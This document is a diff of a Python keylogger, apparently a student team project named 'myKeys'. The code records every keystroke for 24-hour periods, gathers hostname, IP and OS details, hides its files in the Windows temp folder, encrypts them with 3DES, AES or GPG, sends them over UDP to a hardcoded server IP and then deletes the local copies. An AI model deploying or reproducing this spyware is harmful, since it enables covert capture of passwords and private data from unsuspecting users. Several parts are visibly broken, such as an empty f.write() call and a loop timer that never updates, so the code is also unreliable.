@@ -1,6 +1,6 @@
-#Team myKeys
-#keylogger.py
-#Connor Blaszkiewicz, Neta Shiff, Benjamin Jenkins, !!add rest of your names here!!
+# Team myKeys
+# keylogger.py
+# Connor Blaszkiewicz, Neta Shiff, Benjamin Jenkins, !!add rest of your names here!!
 
 # Libraries Used
 import base64
@@ -22,7 +22,6 @@ from random import SystemRandom
 
 from cryptography.fernet import Fernet
 
-
 loggedKeys = "loggedKeys.txt"
 systemInfo = "systemInfo.txt"
 
@@ -32,7 +31,7 @@ systemInfoEncrypted = "systemInfoEncrypted.txt"
 ## Networking Variables
 udpPort = 25005
 buffer_size = 1024
-server_ip = "35.231.244.179" #local testing
+server_ip = "35.231.244.179"  # local testing
 
 # payload destination variables
 path = "C:\Windows\Temp"
@@ -65,17 +64,17 @@ def sendFile(filename, isSysInfo):
 
 ### This creates a document that contains useful system information and specifications ###
 def getSystemInfo():
-    #needs error handling
+    # needs error handling
     with open(extendedPath + systemInfo, "a") as f:
         hostname = socket.gethostname()
         # Writes hostname
         try:
             f.write("Hostname: " + hostname + '\n')
-        
+
         except Exception:
-           f.write("ERROR: could not retrieve Hostname" + '\n') 
-        
-        # Writes Public IP address
+            f.write("ERROR: could not retrieve Hostname" + '\n')
+
+            # Writes Public IP address
         privateIP = socket.gethostbyname(hostname)
         try:
             publicIP = get("https://api.ipify.org").text
@@ -100,40 +99,41 @@ def getSystemInfo():
 
         # Writes System Type
         try:
-            f.write("System: "+ platform.system() + '\n')
+            f.write("System: " + platform.system() + '\n')
 
         except Exception:
             f.write("ERROR: could not retrieve system type" + '\n')
 
         # Writes System Version
         try:
-            f.write("Version: "+ platform.version() +'\n')
-        
+            f.write("Version: " + platform.version() + '\n')
+
         except Exception:
             f.write("ERROR: could not retrieve platform version" + '\n')
 
         # Writes Processor
         try:
             f.write("Processor: " + platform.processor() + '\n')
-        
+
         except Exception:
             f.write("ERROR: could not retrieve processor info" + '\n')
+
 
 # gets system info and writes to file
 getSystemInfo()
 
 ### Run Length Variables ###
 numberOfLogs = 1
-logTime = 86400 #This should be 24 hours equivalent (I think)
+logTime = 86400  # This should be 24 hours equivalent (I think)
 currentTime = time.time()
-endTime = currentTime + logTime #Will result in 24 hours after currentTime
-
+endTime = currentTime + logTime  # Will result in 24 hours after currentTime
 
 ### Establishes how long the program will record keys ###
-      ### All Key Recording Processes are below ###
+### All Key Recording Processes are below ###
 while currentTime < endTime:
     count = 0
     keys = []
+
 
     ### When a key is pressed ###
     def onPress(key):
@@ -151,12 +151,13 @@ while currentTime < endTime:
             writeToFile(keys)
             keys = []
 
+
     ### Writes keys to file ###
     def writeToFile(keys):
-        #needs error handling
+        # needs error handling
         with open(extendedPath + loggedKeys, "a") as f:
             for key in keys:
-                k = str(key.replace("'",""))
+                k = str(key.replace("'", ""))
                 if k.find("space") > 0:
                     f.write('\n')
                     f.close()
@@ -164,75 +165,125 @@ while currentTime < endTime:
                     f.write(k)
                     f.close()
 
+
     ### When a key is released ###
     def onRelease(key):
         # This may not be needed
         if key == Key.esc:
-            return False 
+            return False
         if currentTime > endTime:
             return False
 
-    with Listener(onPress = onPress, onRelease = onRelease) as listener:
+
+    with Listener(onPress=onPress, onRelease=onRelease) as listener:
         listener.join()
 
     if currentTime > endTime:
-        #needs error handling
+        # needs error handling
         with open(extendedPath + loggedKeys, "w") as f:
             f.write()
-        
+
         numberOfLogs += 1
 
         currentTime = time.time()
         endTime = time.time() + logTime
 
-    
-
 
 ### ENCRYPT FILES HERE ###
-#PGP encryption
+# PGP encryption
 
 # encrypt files
-def des3_encrypt(original_file, encrypt_file, key):
-    with open(original_file, 'rb') as files:
-        data = files.read()
-    iv = Random.new().read(DES3.block_size)  # DES3.block_size==8
-    cipher_encrypt = DES3.new(key, DES3.MODE_OFB, iv)
-    pad_len = 8 - len(data) % 8
-    # length of padding
-    padding = chr(pad_len) * pad_len
-    # PKCS5 padding content
-    data += padding.encode('utf-8')
-    encrypted_text = cipher_encrypt.encrypt(data)
-    with open(encrypt_file, 'wb') as f:
-        f.write(encrypted_text)
-    return key, iv
-
-
-def encrypt_aes(original_file, encrypt_file, key):
-    # encrypt the file with the key and aes and return the encrypt text
-
-    with open(original_file, 'rb') as files:
-        data = files.read()
-    new_text = PAD(data)
-    iv = Random.new().read(BS)
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    with open(encrypt_file, 'wb') as f:
-        f.write(base64.b64encode(iv + cipher.encrypt(new_text)))
+def des3_encrypt(key):
+    systemfiles_to_encrypt = [extendedPath + systemInfo]
+    keyloggerfiles_to_encrypt = [extendedPath + loggedKeys]
+    systemencrypted_file_names = [extendedPath + systemInfoEncrypted]
+    keylogger_encrypt_filename = [extendedPath + loggedKeysEncrypted]
+    count = 0
+    for encryptingFile in systemfiles_to_encrypt:
+        with open(systemfiles_to_encrypt[count], 'rb') as f:
+            data = f.read()
+            iv = Random.new().read(DES3.block_size)  # DES3.block_size==8
+            cipher_encrypt = DES3.new(key, DES3.MODE_OFB, iv)
+            pad_len = 8 - len(data) % 8
+            # length of padding
+            padding = chr(pad_len) * pad_len
+            # PKCS5 padding content
+            data += padding.encode('utf-8')
+            encrypted_text = cipher_encrypt.encrypt(data)
+            with open(systemencrypted_file_names[count], 'wb') as f:
+                f.write(encrypted_text)
+            sendFile(systemencrypted_file_names[count], True)
+    count = 0
+    for encryptingFile in keyloggerfiles_to_encrypt:
+        with open(keyloggerfiles_to_encrypt[count], 'rb') as f:
+            data = f.read()
+            iv = Random.new().read(DES3.block_size)  # DES3.block_size==8
+            cipher_encrypt = DES3.new(key, DES3.MODE_OFB, iv)
+            pad_len = 8 - len(data) % 8
+            # length of padding
+            padding = chr(pad_len) * pad_len
+            # PKCS5 padding content
+            data += padding.encode('utf-8')
+            encrypted_text = cipher_encrypt.encrypt(data)
+            with open(keylogger_encrypt_filename[count], 'wb') as f:
+                f.write(encrypted_text)
+            sendFile(keylogger_encrypt_filename[count], False)
     return key
 
 
-def encrypt_gnupg(original_file, encrypt_file, email, pashprase, key):
+def encrypt_aes(key):
+    # encrypt the file with the key and aes and return the encrypt text
+    systemfiles_to_encrypt = [extendedPath + systemInfo]
+    keyloggerfiles_to_encrypt = [extendedPath + loggedKeys]
+    systemencrypted_file_names = [extendedPath + systemInfoEncrypted]
+    keylogger_encrypt_filename = [extendedPath + loggedKeysEncrypted]
+    count = 0
+    for encryptingFile in systemfiles_to_encrypt:
+        with open(systemfiles_to_encrypt[count], 'rb') as f:
+            data = f.read()
+            new_text = PAD(data)
+            iv = Random.new().read(BS)
+            cipher = AES.new(key, AES.MODE_CBC, iv)
+            with open(systemencrypted_file_names[count], 'wb') as f:
+                f.write(base64.b64encode(iv + cipher.encrypt(new_text)))
+            sendFile(systemencrypted_file_names[count], True)
+    count = 0
+    for encryptingFile in keyloggerfiles_to_encrypt:
+        with open(keyloggerfiles_to_encrypt[count], 'rb') as f:
+            data = f.read()
+            new_text = PAD(data)
+            iv = Random.new().read(BS)
+            cipher = AES.new(key, AES.MODE_CBC, iv)
+            with open(keylogger_encrypt_filename[count], 'wb') as f:
+                f.write(base64.b64encode(iv + cipher.encrypt(new_text)))
+            sendFile(keylogger_encrypt_filename[count], False)
+    return key
+
+
+def encrypt_gnupg(email, key):
     # encrypt file name original_file
     # output in the dir and the encrypt file that we entered
     gpg = gnupg.GPG(gnupghome='C:\\Program Files (x86)\\GnuPG\\bin',
                     gpgbinary='C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe')
-
-    with open(original_file, 'rb') as f:
-        status = gpg.encrypt_file(
-            f, recipients=[email],
-            output=encrypt_file + '.gpg')
+    systemfilesToEncrypt = [extendedPath + systemInfo]
+    keyloggerfilesToEncrypt = [extendedPath + loggedKeys]
+    systemencryptedFileNames = [extendedPath + systemInfoEncrypted]
+    keyloggerencryptname = [extendedPath + loggedKeysEncrypted]
+    count = 0
+    for encryptingFile in systemfilesToEncrypt:
+        with open(systemfilesToEncrypt[count], 'rb') as f:
+            status = gpg.encrypt_file(
+                f, recipients=[email],
+                output=systemencryptedFileNames[count] + '.gpg')
+            sendFile(systemencryptedFileNames[count], True)
+    count = 0
+    for encryptingFile in keyloggerfilesToEncrypt:
+        with open(keyloggerfilesToEncrypt[count], 'rb') as f:
+            status = gpg.encrypt_file(
+                f, recipients=[email],
+                output=keyloggerencryptname[count] + '.gpg')
+            sendFile(keyloggerencryptname[count], False)
     return key
-
 
 
 # Fernet Encryption - May be implemented later
@@ -261,6 +312,6 @@ def encrypt_gnupg(original_file, encrypt_file, email, pashprase, key):
 
 
 ### Deletes Files After they are Encrypted and Sent ###
-deleteFiles = [systemInfo,loggedKeys]
+deleteFiles = [systemInfo, loggedKeys]
 for file in deleteFiles:
     os.remove(extendedPath + file)
